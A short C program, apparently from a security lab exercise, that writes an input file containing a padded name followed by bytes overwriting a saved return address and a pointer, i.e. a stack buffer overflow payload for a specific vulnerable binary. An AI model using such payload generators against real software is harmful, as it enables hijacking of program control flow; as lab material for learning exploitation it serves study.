#include <stdio.h>
#include <stdlib.h>

int main(void){
    FILE *f;
    int i=0;
    f = fopen("data6.txt", "w+");
    fprintf(f,"Anastasios Gialamoudis                          ");

    fprintf(f,"8"); /*i=ret address*/
  
    fprintf(f,"%c",104); /*change ret address */
    fprintf(f,"%c",139);
    fprintf(f,"%c",4);
    fprintf(f,"%c",8);

    fprintf(f,"%c",224); /*reformat Name address */
    fprintf(f,"%c",101);
    fprintf(f,"%c",13);
    fprintf(f,"%c",8);
 return 0;
}

